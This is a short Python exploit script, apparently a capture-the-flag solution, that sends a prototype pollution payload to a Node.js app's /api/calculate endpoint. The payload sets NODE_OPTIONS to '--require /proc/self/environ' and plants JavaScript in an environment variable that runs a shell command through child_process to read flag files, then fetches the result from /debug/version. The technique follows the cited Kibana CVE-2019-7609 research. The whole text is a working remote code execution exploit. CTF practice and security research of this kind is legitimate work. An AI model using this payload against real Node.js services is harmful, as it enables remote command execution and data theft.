#https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
#https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
import requests, sys

domain = sys.argv[-1]
requests.post(
    f"{domain}/api/calculate",
    data={
        "name": "Kenny Baker",
        "paper": 10,
        "constructor": {
            "prototype": {
                "env": {
                    "COLORFGBG": "console.log(require('child_process').execSync('cat flag*').toString())//"
                },
                "NODE_OPTIONS": "--require /proc/self/environ",
            }
        },
    },
)
flag = requests.get(f"{domain}/debug/version")
print(flag.text.split("\n")[0])
